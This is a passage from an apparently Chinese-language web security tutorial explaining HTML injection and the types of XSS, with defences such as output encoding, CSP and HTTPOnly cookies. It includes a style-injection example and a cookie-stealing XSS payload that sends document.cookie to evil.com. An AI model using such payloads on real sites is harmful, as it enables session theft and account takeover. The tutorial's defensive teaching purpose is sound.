    <h4>
     <a id="1_HTML_36">
     </a>
     1.
     <strong>
      HTML注入：页面篡改的“画笔”
     </strong>
    </h4>
    <h5>
     <a id="_37">
     </a>
     漏洞原理
    </h5>
    <p>
     用户输入未过滤 → 恶意HTML代码渲染 → 页面内容篡改。
     <br/>
     <strong>
      示例
     </strong>
     ：
    </p>
    <pre><code class="prism language-html"><span class="token comment">&lt;!-- 用户输入篡改背景 --&gt;</span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"> <span class="token selector">body</span> <span class="token punctuation">{<!-- --></span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'http://evil.com/logo.png'</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>  
</code></pre>
    <p>
     <strong>
      防御
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       输入过滤
      </strong>
      ：移除
      <code>
       &lt;
      </code>
      ,
      <code>
       &gt;
      </code>
      等特殊字符。
     </li>
     <li>
      <strong>
       输出编码
      </strong>
      ：使用
      <code>
       htmlspecialchars()
      </code>
      （PHP）或DOMPurify（JS）。
     </li>
    </ul>
    <hr/>
    <h4>
     <a id="2_XSSCookie_51">
     </a>
     2.
     <strong>
      XSS：窃取Cookie的“隐形手”
     </strong>
    </h4>
    <h5>
     <a id="_52">
     </a>
     攻击类型对比
    </h5>
    <table>
     <thead>
      <tr>
       <th>
        <strong>
         类型
        </strong>
       </th>
       <th>
        <strong>
         触发方式
        </strong>
       </th>
       <th>
        <strong>
         攻击场景
        </strong>
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        <strong>
         反射型XSS
        </strong>
       </td>
       <td>
        恶意链接诱导点击
       </td>
       <td>
        搜索结果页、错误提示页
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         存储型XSS
        </strong>
       </td>
       <td>
        恶意脚本存入数据库
       </td>
       <td>
        评论区、用户资料页
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         DOM型XSS
        </strong>
       </td>
       <td>
        前端动态渲染未过滤
       </td>
       <td>
        URL参数操作DOM元素
       </td>
      </tr>
     </tbody>
    </table>
    <p>
     <strong>
      Payload示例
     </strong>
     ：
    </p>
    <pre><code class="prism language-javascript"><span class="token comment">// 窃取Cookie  </span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://evil.com?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  
</code></pre>
    <p>
     <strong>
      防御
     </strong>
     ：
    </p>
    <ul>
     <li>
      <strong>
       CSP策略
      </strong>
      ：
      <code>
       Content-Security-Policy: script-src 'self'
      </code>
     </li>
     <li>
      <strong>
       HTTPOnly Cookie
      </strong>
      ：禁止JS访问敏感Cookie。
     </li>
    </ul>
